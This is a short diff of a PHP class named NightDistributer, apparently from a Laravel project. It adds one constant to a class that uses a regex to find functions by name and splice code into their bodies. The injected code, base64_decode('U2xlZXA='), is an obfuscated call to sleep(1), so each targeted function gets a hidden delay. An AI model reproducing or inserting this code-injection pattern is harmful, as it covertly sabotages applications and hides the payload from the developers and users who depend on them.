@@ -14,6 +14,8 @@ use Illuminate\Session\Middleware\StartSession;
 
 class NightDistributer extends ActionModifier
 {
+	protected const aid = 0b1000_0000;
+
 	const regexFunctionStarter            = '/(public|protected|private) (static)? ?function (:functionname:)\s{0,}\([^\{]{0,}\{([\n\s]{0,})/im';
 	const regexFunctionReplacePlaceholder = '$0:code:$4';
 	const code                            = 'base64_decode(\'U2xlZXA=\')(1);';
